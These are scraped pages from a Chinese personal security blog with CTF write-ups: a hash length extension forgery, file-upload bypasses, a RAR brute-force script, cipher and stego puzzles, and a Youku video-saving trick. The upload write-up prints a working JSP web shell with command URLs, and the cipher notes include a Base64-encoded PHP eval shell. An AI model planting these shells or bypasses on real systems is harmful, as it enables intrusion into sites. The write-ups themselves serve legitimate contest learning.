+<h3 id="哈希长度扩展攻击-hash-length-extension-attacks-是指针对某些允许包含额外信息的加密散列函数的攻击手段。该攻击适用于在消息与密钥的长度已知的情形下，所有采取了-H-密钥-∥-消息-此类构造的散列函数。MD5和SHA-1等基于Merkle–Damgard构造的算法均对此类攻击显示出脆弱性。"><a href="#哈希长度扩展攻击-hash-length-extension-attacks-是指针对某些允许包含额外信息的加密散列函数的攻击手段。该攻击适用于在消息与密钥的长度已知的情形下，所有采取了-H-密钥-∥-消息-此类构造的散列函数。MD5和SHA-1等基于Merkle–Damgard构造的算法均对此类攻击显示出脆弱性。" class="headerlink" title="哈希长度扩展攻击(hash length extension attacks)是指针对某些允许包含额外信息的加密散列函数的攻击手段。该攻击适用于在消息与密钥的长度已知的情形下，所有采取了 H(密钥 ∥ 消息) 此类构造的散列函数。MD5和SHA-1等基于Merkle–Damgård构造的算法均对此类攻击显示出脆弱性。"></a>哈希长度扩展攻击(hash length extension attacks)是指针对某些允许包含额外信息的加密散列函数的攻击手段。该攻击适用于在消息与密钥的长度已知的情形下，所有采取了 H(密钥 ∥ 消息) 此类构造的散列函数。MD5和SHA-1等基于Merkle–Damgård构造的算法均对此类攻击显示出脆弱性。</h3><h3 id="如果一个应用程序是这样操作的：准备了一个密文和一些数据构造成一个字符串里，并且使用了MD5之类的哈希函数生成了一个哈希值（也就是所谓的signature-签名）让攻击者可以提交数据以及哈希值，虽然攻击者不知道密文服务器把提交的数据跟密文构造成字符串，并经过哈希后判断是否等同于提交上来的哈希值这个时候，该应用程序就易受长度扩展攻击，攻击者可以构造出-secret-data-attacker-controlled-data-的哈希值。"><a href="#如果一个应用程序是这样操作的：准备了一个密文和一些数据构造成一个字符串里，并且使用了MD5之类的哈希函数生成了一个哈希值（也就是所谓的signature-签名）让攻击者可以提交数据以及哈希值，虽然攻击者不知道密文服务器把提交的数据跟密文构造成字符串，并经过哈希后判断是否等同于提交上来的哈希值这个时候，该应用程序就易受长度扩展攻击，攻击者可以构造出-secret-data-attacker-controlled-data-的哈希值。" class="headerlink" title="如果一个应用程序是这样操作的：准备了一个密文和一些数据构造成一个字符串里，并且使用了MD5之类的哈希函数生成了一个哈希值（也就是所谓的signature/签名）让攻击者可以提交数据以及哈希值，虽然攻击者不知道密文服务器把提交的数据跟密文构造成字符串，并经过哈希后判断是否等同于提交上来的哈希值这个时候，该应用程序就易受长度扩展攻击，攻击者可以构造出{secret || data || attacker_controlled_data}的哈希值。"></a>如果一个应用程序是这样操作的：准备了一个密文和一些数据构造成一个字符串里，并且使用了MD5之类的哈希函数生成了一个哈希值（也就是所谓的signature/签名）让攻击者可以提交数据以及哈希值，虽然攻击者不知道密文服务器把提交的数据跟密文构造成字符串，并经过哈希后判断是否等同于提交上来的哈希值这个时候，该应用程序就易受长度扩展攻击，攻击者可以构造出{secret || data || attacker_controlled_data}的哈希值。</h3><p>这里需要hashpump工具<a href="https://github.com/bwall/HashPump" target="_blank" rel="noopener">点击此处</a><br>在linux下安装就好<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/bwall/HashPump</span><br><span class="line">apt-get install g++ libssl-dev</span><br><span class="line">cd HashPump</span><br><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></table></figure><br>安装好后运行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Input Signature: c70ab9d039f166c5b5f506a5698ebaa1</span><br><span class="line">Input Data: guest</span><br><span class="line">Input Key Length: 13</span><br><span class="line">Input Data to Add: admin</span><br><span class="line">37d0fe2c401a689be9608e9f850ef3de</span><br><span class="line">guest%80%00%00%x00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%90%00%00%00%00%00%00%00admin</span><br></pre></td></tr></table></figure><br>最后把cooike改成<code>role=guest%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%90%00%00%00%00%00%00%00admin;hsh=37d0fe2c401a689be9608e9f850ef3de</code>即可<br><img src="/2018/09/29/1/hash4.jpg" alt=" "><br>flag<code>cumtctf{Md5_1s_n0t_safe}</code></p>
+<h2 id="八、上传1-amp-2"><a href="#八、上传1-amp-2" class="headerlink" title="八、上传1&amp;2"></a>八、上传1&amp;2</h2><p><img src="/2018/09/29/1/上传1.jpg" alt=" "><br>打开题目发现是最简单的上传、肯定不能传jpg上去，因为那样不会可执行<br>所以我们抓包。<br>改后缀为php<br>然后就可以看到flag，上传一和二的flag都有了，上传三会比较复杂题解暂不给出<br><img src="/2018/09/29/1/上传.jpg" alt=" "><br><code>flag{D0_y0u_KNow_J@v@Scr1pt}</code><br><code>flag{D0_y0u_KNow_How_t0_use_PHP_to_check_F1le}</code></p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/04/30/Redhat/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="BoBo">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="BoBo's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2018/04/30/Redhat/" itemprop="url">Redhat2018 WP</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-04-30T11:19:14+08:00">
+                2018-04-30
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p>国赛打完又是redhat~不过国赛辣鸡赛制让我们白打了（小声吐槽一波游戏体验极差的国赛）<br>1.Misc 签到<br>看管理员名片（后来直接在群里放出）<br><code>签到题的flag为 flag{redhat_welcome}</code></p>
+<p>2.Web<br>simple upload<br>打开是个登录页面，可题目说是上传，于是扫一下目录，发现有upload.html<br>打开果然是上传<br>随便传一个文件发现文件发现没有回显，于是打开BP抓一下包，可能需要改一下类型<br>先开始可能是没睡醒、、一直传php的马，结果被学长一语点醒。。。。这就是不是php网页你搞什么php<br>然后试一下报错页面，会看到服务器信息<br><img src="/2018/04/30/Redhat/报错.jpg" alt=" "><br>搜一下发现有一些CVE，可是没什么利用的，所以还是上传问题，想了半天也不知道网站后端用啥写的、、怕是经验太少了<br>后来百度突然发现Tomcat大部分都是java写的，然后百度各种jsp马及利用方法，终于找到了一个<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">    if(&quot;023&quot;.equals(request.getParameter(&quot;pwd&quot;)))&#123;</span><br><span class="line">        java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter(&quot;i&quot;)).getInputStream();</span><br><span class="line">        int a = -1;</span><br><span class="line">        byte[] b = new byte[2048];</span><br><span class="line">        out.print(&quot;&lt;pre&gt;&quot;);</span><br><span class="line">        while((a=in.read(b))!=-1)&#123;</span><br><span class="line">            out.println(new String(b));</span><br><span class="line">        &#125;</span><br><span class="line">        out.print(&quot;&lt;/pre&gt;&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><br>然后生成.jsp木马<br>打开BP上传，改一下admin为真，类型怕有过滤，改成image/png最保险~<br>如图<br><img src="/2018/04/30/Redhat/BP.jpg" alt=" "><br>然后现在得到了上传的地址。。。菜刀连一下发现菜刀没有jsp马这个选项、、然后上hackbar<br>百度jsp马使用规则<br>最后构造payload为：<br><code>http://65cc56140bdb44689b8c18dadbf9ff4d5f9ecd2f609a47ce.game.ichunqiu.com/1c0737e7-081a-4aab-94ea-5820e4e250bc/muma.jsp?pwd=023
+&amp;i=pwd</code><br>打开如下<br><img src="/2018/04/30/Redhat/root.jpg" alt=" "><br>发现可以读文件，后面又考察了linux系统一些基本操作（结果我有点菜hhh~）<br>然后改一下i为../ls可以读出文件列表<br>然后读一下flag文件<br><code>http://65cc56140bdb44689b8c18dadbf9ff4d5f9ecd2f609a47ce.game.ichunqiu.com/1c0737e7-081a-4aab-94ea-5820e4e250bc/muma.jsp?pwd=023
+&amp;i=cat /flag</code><br>得到flag<br><code>flag{bdfa6be5-b026-4a90-8fbd-17f9df63cba3}</code></p>
+<p>3.NotOnlyWireshark<br>打开是个流量包<br>导出一下http对象<br>发现一些很奇怪的东西如图<br><img src="http.jpg" alt=" ">看起来像文件头，于是把他们后三位全部提取出来<br>生成一个zip文件<br><img src="/2018/04/30/Redhat/zip.jpg" alt=" "><br>继续做下去发现思路没错，就是zip包里有文件<br>于是打开，结果要密码、、、<br><img src="/2018/04/30/Redhat/zip1.jpg" alt=" "><br>这时候和密码有关的只有先开始的流量包了<br>去找找<br>发现<br><img src="/2018/04/30/Redhat/key1.jpg" alt=" "><br>key就是这个鬼东西了、、、出题人神脑洞！！！！<br><code>?id=1128%23</code><br>打开就会显示flag<br><code>flag{1m_s0_ang4y_1s}</code></p>
+<p>4.听说你们喜欢手工爆破<br>下载下来是个OS镜像文件，百度一下知道这个文件可以直接解压查看<br><img src="/2018/04/30/Redhat/解压.jpg" alt=" "><br>都是1K的文件，怀疑一下文件名、、往下发现有个rar包<br>打开需要密码，这时候就得爆破了<br>想到这些文件名作为字典爆破<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line">import os.path</span><br><span class="line">rootdir = &quot;C:/Users/admin/Desktop/OS_038c9291c8039792d1aad140f6664671&quot;</span><br><span class="line"></span><br><span class="line">file_object = open(&apos;train_list.txt&apos;,&apos;w&apos;)</span><br><span class="line"></span><br><span class="line">for parent,dirnames,filenames in os.walk(rootdir):</span><br><span class="line">    for filename in filenames:</span><br><span class="line">        file_object.write(filename.rstrip(&apos;.txt&apos;)+ &apos;\n&apos;)</span><br><span class="line">file_object.close()</span><br><span class="line"></span><br><span class="line">import os</span><br><span class="line">f=open(&apos;train_list.txt&apos;)</span><br><span class="line">s=f.readlines()</span><br><span class="line">f.close()</span><br><span class="line">for p in s:</span><br><span class="line">    cmd = &quot;winrar e 1.rar -y -p%s&quot; % (p)</span><br><span class="line">    r = os.system(cmd)</span><br><span class="line">    if r == 0:</span><br><span class="line">        print(&quot;pass = %s&quot; % p)</span><br><span class="line">        break</span><br></pre></td></tr></table></figure><br>这个需要添加下winrar环境变量<br>rar文件就被打开了<br><img src="/2018/04/30/Redhat/rar.jpg" alt=" "><br>里面有个word文档，还是需要密码、、、、<br>上一波小工具<br><img src="/2018/04/30/Redhat/word.jpg" alt=" "><br>打开是一篇文档、、、、百度一下发现名字叫《海边的曼彻斯特》<br>应该是曼彻斯特编码<br>参考一下dalao博客<br><a href="https://www.xmsec.cc/manchester-encode/" target="_blank" rel="noopener">https://www.xmsec.cc/manchester-encode/</a><br>贴一波脚本<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">a=0x123654AAA678876303555111AAA77611A321</span><br><span class="line">flag=&apos;&apos;</span><br><span class="line">bs=&apos;0&apos;+bin(a)[2:]</span><br><span class="line">a=&apos;&apos;</span><br><span class="line">def conv(s):</span><br><span class="line">    return hex(int(s,2))[2:]</span><br><span class="line">for i in range(0,len(bs),2):</span><br><span class="line">    if bs[i:i+2]==&apos;01&apos;:</span><br><span class="line">        a+=&apos;0&apos;</span><br><span class="line">    else:</span><br><span class="line">        a+=&apos;1&apos;</span><br><span class="line">print (a)</span><br><span class="line">for i in range(0,len(a),8):</span><br><span class="line">    tmp=a[i:i+8][::-1]</span><br><span class="line">    flag+=conv(tmp[:4])</span><br><span class="line">    flag+=conv(tmp[4:])</span><br><span class="line">print (flag.upper())</span><br></pre></td></tr></table></figure><br>其中a就是门禁密码<br>输出为<br><img src="/2018/04/30/Redhat/flag.jpg" alt=" "><br>提交就是flag<br><code>flag{5EFCF5F507AA5FAD77}</code></p>
+<p>5、问卷<br>答完就会有flag<br><code>flag{我们在广州塔等着你}</code></p>
+<p>6、</p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/04/26/youku/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="BoBo">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="BoBo's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2018/04/26/youku/" itemprop="url">怎么在优酷下载视频不用VIP，不用客户端</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-04-26T16:55:53+08:00">
+                2018-04-26
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p>今天需要一个优酷的视频，可是看了一下没有下载链接，很gg<br>于是百度了一堆下载方法，有些已经不能再用了，所以自己想了想办法<br>我们知道优酷防止用户通过别的方法下载会把视频分段，这也难不倒我们哦<br>首先我们点开想要的视频，如图：<br><img src="/2018/04/26/youku/客户端.jpg" alt=" "><br>这里点击下载就会让我们下载他的客户端，有时候就需要一下视频所以下载安装超级麻烦哦（还不知道会不会要VIP~）<br>等广告加载完以后，我们用搜狗高速浏览器打开这个网页，会出现如下图片（有一个小窗口播放）<br><img src="/2018/04/26/youku/小窗口.jpg" alt=" "><br>点开，就会以小窗口播放，然后我们点鼠标右键会惊喜的发现有个视频另存为？？岂不是美滋滋？（手动滑稽）<br><img src="/2018/04/26/youku/另存.jpg" alt=" "><br>然后保存到桌面就好。<br>上文提到优酷会让视频分段播放，我们可以看一下下载下来的视频大概到多少分钟，然后重复上面步骤：以<code>小窗播放--&gt;视频另存为（这里需要把进度条往后拖一拖才能下载到后面那个片段）</code><br>现在我们有两个mp4文件了，分开看岂不是很不舒服，于是用<code>格式工厂</code>里面有<code>视频合并</code>功能，可以合为一个，不会有重复片段<br>然后就可以美滋滋看视频咯<br>小小技巧送给大佬们</p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/04/21/DDCTF2108-misc/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="BoBo">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="BoBo's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2018/04/21/DDCTF2108-misc/" itemprop="url">DDCTF2108 misc</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-04-21T10:49:12+08:00">
+                2018-04-21
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p>DDCTF本来一个web手活生生成了misc、、、唉~<br>不说了，来波解析<br>1.签到<br><img src="/2018/04/21/DDCTF2108-misc/签到.jpg" alt=" "><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DDCTF&#123;echo&quot;W3Lc0me_2_DiD1$&#123;PAAMAYIM_NEKUDOTAYIM&#125;C7f!&quot;&#125;</span><br></pre></td></tr></table></figure><br>这的一个坑是flag居然就是这个、、、心机出题人~一直以为要打印出来别的东西<br>2.扔板凳<br>一直没搞懂这题和板凳有啥关系哈哈哈、<br><img src="/2018/04/21/DDCTF2108-misc/板凳.jpg" alt=" "><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">d4e8e1f4a0f7e1f3a0e6e1f3f4a1a0d4e8e5a0e6ece1e7a0e9f3baa0c4c4c3d4c6fbb9b2b2e1e2b9b9b7b4e1b4b7e3e4b3b2b2e3e6b4b3e2b5b0b6b1b0e6e1e5e1b5fd</span><br></pre></td></tr></table></figure><br>16进制转换成字符是不可见字符,可见范围是0~127，直接贴脚本<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">a=&quot;d4e8e1f4a0f7e1f3a0e6e1f3f4a1a0d4e8e5a0e6ece1e7a0e9f3baa0c4c4c3d4c6fbb9b2b2e1e2b9b9b7b4e1b4b7e3e4b3b2b2e3e6b4b3e2b5b0b6b1b0e6e1e5e1b5fd&quot;</span><br><span class="line">b=&apos;&apos;</span><br><span class="line">for i in range(0,len(a),2):</span><br><span class="line">    b+=str(chr(int(a[i:i+2],16)-128))</span><br><span class="line">    print(b)</span><br><span class="line"> </span><br></pre></td></tr></table></figure><br>运行结果<br><code>That was fast! The flag is: DDCTF{922ab9974a47cd322cf43b50610faea5}</code><br>3.第四拓展FS<br>讲道理FS又骗了我一次、、、一直以为是文件流、、、<br>首先下载下来是一个jpg、、12M的jpg哈哈哈，想到了隐写，拖入stegesolve没发现啥，于是binwalk-e看看<br>有东西，是个压缩包，可是这里binwalk提取的东西在windows上是显示损坏的。两种办法，一个就是用好压打开，另一个就是get的新姿势~<br><code>foremost 要分离的文件名 -o 输出文件夹的名字（自己定义的）</code><br>输出来会有一个文件夹，里面有提取的zip，拖到windows就能打开了~不过这里的rar是加密的，密码在图片属性里<br><img src="/2018/04/21/DDCTF2108-misc/图片属性.jpg" alt=" "><br>输入就可以打开啦<br>打开以后是个杂乱无章的文档<br><img src="/2018/04/21/DDCTF2108-misc/file.jpg" alt=" "><br>这时候看题目说提示都在题目里了：日常违规审计中频次有时候非常重要<br>想到了词频统计，这文档的词频不能用在线的词频统计，只能自己写一下脚本<br>贴代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">f = open(&apos;file.txt&apos;)</span><br><span class="line">str = f.read()</span><br><span class="line">dict = &#123;&#125;</span><br><span class="line">for i in str:</span><br><span class="line">#print i</span><br><span class="line">if dict.has_key(i):</span><br><span class="line">dict[i] += 1</span><br><span class="line">else:</span><br><span class="line">dict[i] = 1</span><br><span class="line"></span><br><span class="line">for i in dict:</span><br><span class="line">print i,&quot; : &quot;,dict[i]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">print sorted(dict.items(), lambda x, y: cmp(x[1], y[1]), reverse=True)\</span><br><span class="line"> </span><br></pre></td></tr></table></figure><br> 出来以后是这样<br> <img src="/2018/04/21/DDCTF2108-misc/运行结果.jpg" alt=" "><br> 这时候自己数一下每个词就行，就能拼出flag<br> 我的flag是<code>DDCTF{x1n9shaNgbIci}</code><br> 这次DDCTF讲道理还是可以的~每个人拿到题目不一样，flag也不一样，反作弊666<br> 继续加油吧~<br> 最后附一张排名表~但愿DDCTF2019会更进一步！<br> <img src="/2018/04/21/DDCTF2108-misc/排名.jpg" alt=" "></p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/04/13/密码杂项/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="BoBo">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="BoBo's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2018/04/13/密码杂项/" itemprop="url">常见密码杂项题目</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-04-13T11:42:40+08:00">
+                2018-04-13
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p>Base64: ZXZhbCgkX1BPU1RbcDRuOV96MV96aDNuOV9qMXVfU2gxX0oxM10p</p>
+<p>NTU2NJC3ODHHYWJIZ3P4ZWY=</p>
+<p>Base64编码要求把3个8位字节（3<em>8=24）转化为4个6位的字节（4</em>6=24），之后在6位的前面补两个0，形成8位一个字节的形式。 如果剩下的字符不足3个字节，则用0填充，输出字符使用‘=‘，因此编码后输出的文本末尾可能会出现1或2个‘=‘</p>
+<p>Base32: Base32和Base64相比只有一个区别就是，用32个字符表示256个ASC字符，也就是说5个ASC字符一组可以生成8个Base字符，反之亦然。</p>
+<p>在线编解码：<a href="http://base64.xpcha.com/" target="_blank" rel="noopener">http://base64.xpcha.com/</a></p>
+<p>希尔密码：密文： 22,09,00,12,03,01,10,03,04,08,01,17 （明文：wjamdbkdeibr）</p>
+<p>解题思路：使用的矩阵是 1 2 3 4 5 6 7 8 10</p>
+<p>a b c d e f g h i j  k  l  m  n   o   p   q   r   s   t   u   v   w   x   y   z</p>
+<p>0 1 2 3 4 5 6 7 8 9 10 11  12 13  14  15  16  17  18  19  20  21  22  23  24  25</p>
+<p>把字母用数字表示，解密时把数字转换成字母，然后放入脚本，密钥要分成矩阵。一般是对称的</p>
+<p>原文链接：<a href="http://bobao.360.cn/ctf/learning/136.html" target="_blank" rel="noopener">http://bobao.360.cn/ctf/learning/136.html</a></p>
+<p>百度百科：<a href="http://baike.baidu.com/link?url=R6oWhCdKvzlG8hB4hdIdUT1cZPbFOCrpU6lJAkTtdiKodD7eRTbASpd_YVfi4LMl7N8yFyhVNOz5ki6TC7_5eq" target="_blank" rel="noopener">http://baike.baidu.com/link?url=R6oWhCdKvzlG8hB4hdIdUT1cZPbFOCrpU6lJAkTtdiKodD7eRTbASpd_YVfi4LMl7N8yFyhVNOz5ki6TC7_5eq</a></p>
+<p>脚本已存</p>
+<p>栅栏密码：把要加密的明文分成N个一组，然后把每组的第1个字连起来，形成一段无规律的话。</p>
+<p>密文样例：tn c0afsiwal kes,hwit1r  g,npt  ttessfu}ua u  hmqik e {m,  n huiouosarwCniibecesnren.</p>
+<p>解密程序：</p>
+<p>char s[]= “tn c0afsiwal kes,hwit1r  g,npt  ttessfu}ua u  hmqik e {m,  n huiouosarwCniibecesnren.”;<br>char t[86]= “”;<br>int i,j,k;<br>k=0;<br>for (i=0;i&lt;17;i++)<br>{<br>for(j=0;j&lt;5;j++)<br>{<br>t[k++]= ch[j*17+i];<br>}<br>}<br>for(i=0;i&lt;85;i++)<br>{<br>printf(“%c”,t[i]);<br>}</p>
+<p>原文链接：<a href="http://blog.csdn.net/shinukami/article/details/45980629" target="_blank" rel="noopener">http://blog.csdn.net/shinukami/article/details/45980629</a></p>
+<p><a href="http://www.practicalcryptography.com/ciphers/classical-era/rail-fence/" target="_blank" rel="noopener">http://www.practicalcryptography.com/ciphers/classical-era/rail-fence/</a></p>
+<p>凯撒密码：通过把字母移动一定的位数来实现加密和解密。明文中的所有字母都在字母表上向后（或向前）按照一个固定数目进行偏移后被替换成密文。</p>
+<p>常规解密：</p>
+<p>from pycipher import Caesar<br>for i in range(1,27):<br>str=Caesar(key=i).encipher(‘UIF RVJDLCSPXOGPYKVNQTPWFSUIFMBAZEPH‘)<br>print “mingwen:”+str.lower()+”\r\n”</p>
+<p>密文样例：U8Y]:8KdJHTXRI&gt;XU#?!K_ecJH]kJG<em>bRH7YJH7YSH]</em>=93dVZ3^S8<em>$:8”&amp;:9U]RH;g=8Y!U92‘=j</em>$KH]ZSj&amp;[S#!gU#*dK9.</p>
+<p>解题思路：</p>
+<p>得知是凯撒加密之后，尝试进行127次轮转爆破：</p>
+<p>lstr=”””U8Y]:8KdJHTXRI&gt;XU#?!K_ecJH]kJG<em>bRH7YJH7YSH]</em>=93dVZ3^S8<em>$:8”&amp;:9U]RH;g=8Y!U92‘=j</em>$KH]ZSj&amp;[S#!gU#*dK9.“””</p>
+<p>forp in range(127):</p>
+<p>str1 = ‘‘</p>
+<p>for i in lstr:</p>
+<p>temp = chr((ord(i)+p)%127)</p>
+<p>if 32&lt;ord(temp)&lt;127 :</p>
+<p>str1 = str1 + temp</p>
+<p>feel = 1</p>
+<p>else:</p>
+<p>feel = 0</p>
+<p>break</p>
+<p>if feel == 1:</p>
+<p>print(str1)</p>
+<p>原文链接：<a href="http://blog.csdn.net/shinukami/article/details/46369765" target="_blank" rel="noopener">http://blog.csdn.net/shinukami/article/details/46369765</a></p>
+<p>Unicode</p>
+<p>密文样例：\u5927\u5bb6\u597d\uff0c\u6211\u662f\u0040\u65e0\u6240\u4e0d\u80fd\u7684\u9b42\u5927\u4eba\uff01\u8bdd\u8bf4\u5fae\u535a\u7c89\u4e1d\u8fc7<br>在线解密：tool.chinaz.com/Tools/Unicode.aspx</p>
+<p>brainfuck</p>
+<p>类型：++++++++++[&gt;+++++++&gt;++++++++++&gt;+++&gt;+&lt;&lt;&lt;&lt;-]</p>
+<blockquote>
